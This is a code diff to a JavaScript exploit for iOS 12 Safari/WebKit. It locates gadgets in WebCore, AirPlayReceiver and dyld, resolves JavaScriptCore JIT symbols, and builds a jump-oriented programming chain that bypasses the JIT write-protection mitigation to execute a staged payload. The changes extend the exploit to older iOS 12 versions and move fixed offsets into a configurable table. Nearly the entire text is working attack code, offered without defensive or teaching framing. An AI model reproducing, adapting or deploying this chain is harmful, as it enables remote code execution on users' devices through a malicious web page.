@@ -264,21 +264,23 @@ function resolve_symbol_addresses(macho_base, names) {
 }
 
 function obtain_libcpp_base(vtab_addr) {
+    log(`vtab_addr: ${vtab_addr}`)
     var adrpldr_ZSt7nothrow_addr = Sub(vtab_addr, vtab_addr.lo() & 0xfff);
-    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, 0x94c00);
+    adrpldr_ZSt7nothrow_addr = Sub(adrpldr_ZSt7nothrow_addr, offsets.webcore_libcpp_ref_gadget_off);
 
     var try_count = 0;
     var opcode;
     while (true) {
         if(try_count > 0x1000) {
-            log(`[-] failed webkit patchfinder`);
-            return;
+            log(`[-] failed obtain_libcpp_base`);
+            return null;
         }
 
         opcode = read64(adrpldr_ZSt7nothrow_addr);
 
         // WebCore:__text:000000018AF86AA0 CB 01 00 54                             B.LT            loc_18AF86AD8
         // WebCore:__text:000000018AF86AA4 E8 EF 40 B2                             MOV             X8, #0xFFFFFFFFFFFFFFF
+        // CB 01 00 54 E8 EF 40 B2 
         if(opcode == 0xB240EFE8540001CB) {
             break;
         }
@@ -391,13 +393,14 @@ function find_ldrx8_gadget(security_base, SSLGetPeerDomainName_addr) {
 function find_dispatch_gadget(airplayreceiver_base, APAdvertiserGetTypeID_addr) {
     var try_count = 0;
     var dispatch = Add(airplayreceiver_base, APAdvertiserGetTypeID_addr);
-    dispatch = Sub(dispatch, 0x2000);
+    dispatch = Sub(dispatch, offsets.airplay_dispatch_ref_gadget_off);
     while (true) {
         if(try_count > 13000) {
             log(`[-] failed find_dispatch_gadget`);
             return null;
         }
 
+        // A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
         // AirPlayReceiver:__text:00000001A9AC7958 A0 02 3F D6                             BLR             X21
         // AirPlayReceiver:__text:00000001A9AC795C FD 7B 43 A9                             LDP             X29, X30, [SP,#0x30]
         // AirPlayReceiver:__text:00000001A9AC7960 F4 4F 42 A9                             LDP             X20, X19, [SP,#0x20]
@@ -493,6 +496,7 @@ function obtain_dyld_base(libdyld_base, dyld_process_info_notify_release_addr) {
     return dyld_base;
 }
 
+var malloc_nogc = [];
 function pwn() {
     offsets.resolve();
 
@@ -592,7 +596,6 @@ function pwn() {
       return str;
     }
 
-    var malloc_nogc = [];
     function malloc(sz) {
         var arr = new Uint8Array(sz);
         malloc_nogc.push(arr);
@@ -645,12 +648,23 @@ function pwn() {
     log(`[Stage 3] Obtaining func offsets from symbol name...`);
 
     var jsc_symbols = [
-        "___ZN3JSC29jitWriteSeparateHeapsFunctionE",
-        "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv"
+        "___ZN3JSC29jitWriteSeparateHeapsFunctionE",    //iOS 12.0~12.5.x
+        "___ZN3JSC36startOfFixedExecutableMemoryPoolImplEv",    //iOS 12.2 or higher
+        "___ZN3JSC38taggedStartOfFixedExecutableMemoryPoolE", //iOS 12.1.x or lower
+        "___ZN3JSC36taggedEndOfFixedExecutableMemoryPoolE"  //iOS 12.1.x or lower
     ];
     var symbolsAddr = resolve_symbol_addresses(jsc_base, jsc_symbols);
     var jitWriteSeparateHeaps_addr = symbolsAddr[0];
     var startOfFixedExecutableMemoryPoolImpl_addr = symbolsAddr[1];
+
+    var memPoolStart = null;
+    var memPoolEnd = null;
+    if(symbolsAddr[2]) {
+        memPoolStart = read64(Add(jsc_base, symbolsAddr[2]));
+    }
+    if(symbolsAddr[3]) {
+        memPoolEnd = read64(Add(jsc_base, symbolsAddr[3]));
+    }
 
     var libdyld_symbols = [
         "__dlsym",
@@ -727,18 +741,21 @@ function pwn() {
 
     //6. We've done here, get code execution
     log(`[Stage 6] Prepare code execution...`);
-
     
     // needed to bypass seperated RW, RX JIT mitigation
-    var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));
-    __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
-    log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
-    var __MergedGlobals_52 = read64(Add(jsc_base, __MergedGlobals_52_addr));
-    var memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
-    var memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
+    
+    if(startOfFixedExecutableMemoryPoolImpl_addr) { //iOS 12.2 or later
+        var __MergedGlobals_52_addr = follow_adrpLdr(Add(jsc_base, startOfFixedExecutableMemoryPoolImpl_addr));alert(2);
+        __MergedGlobals_52_addr = Sub(__MergedGlobals_52_addr, jsc_base);
+        log(`[+] __MergedGlobals_52: ${__MergedGlobals_52_addr}`);
+        var __MergedGlobals_52 = read64(Add(jsc_base, __MergedGlobals_52_addr));
+        memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
+        memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
+    }
+    log(`[+] memPoolStart = ${memPoolStart}`);  
+    log(`[+] memPoolEnd = ${memPoolEnd}`);
+    
     var jitWriteSeparateHeaps = read64(Add(jsc_base, jitWriteSeparateHeaps_addr));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
-    log(`[i] memPoolStart = ${memPoolStart}`);  
-    log(`[i] memPoolEnd = ${memPoolEnd}`);
     log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps}`);
     var longjmp = Add(libsystem_platform_base, longjmp_addr);
     var usleep = Add(libsystem_c_base, usleep_addr);
@@ -751,13 +768,13 @@ function pwn() {
     write64(cookieAddr, new Int64(0));
     log(`[i] writechk  = ${read64(cookieAddr)}`);
 
-
-
-
-
     // JOP START !!!
-    var x19 = malloc(0x100);
-    var x8 = malloc(0x8)
+    // var x19 = malloc(0x200);
+    // var x8 = malloc(0x8)
+    var x19 = Add(dyld_base, offsets.cookieAddr+0x200);
+    var x8 = Add(dyld_base, offsets.cookieAddr+0x300);
+
+
     log(`[i] x19 = ${x19}, x8 = ${x8}`);
     write64(Add(wrapper_addr, FPO + 8), new Int64(x19));
     log(`[i] writechk ${read64(Add(wrapper_addr, FPO + 8))}`);
@@ -1034,8 +1051,8 @@ function pwn() {
     add_call(jmpAddr
         , paddr //x0 payload addr
         , dlsym //x1 dlsym
-        , memPoolEnd //x2 jitend
-        , new Int64(0xcafebabe4141414c) //x3
+        , memPoolEnd //x2 
+        , memPoolStart //x3
         , new Int64(0xcafebabe41414150) //x4
     );
 
@@ -1046,11 +1063,15 @@ function pwn() {
     }
 
     //set longjmp's register
-    write64(Add(x19, 0x58), new Int64(stackloader));
+    // write64(Add(x19, 0x40), new Int64(0x4141414141414140));
+    // write64(Add(x19, 0x48), new Int64(0x4141414141414144));
+    // write64(Add(x19, 0x50), new Int64(0x4141414141414148));
+
     var sp = Add(stack, (arrsz - off) * 4);
+    write64(Add(x19, 0x58), new Int64(stackloader));
     write64(Add(x19, 0x60), new Int64(sp));
 
-    alert("Done building JOP chain, executing stages payload!");
+    // alert("Done building JOP chain, executing stages payload!");
 
     wrapper.addEventListener("click", function(){ }); 
 
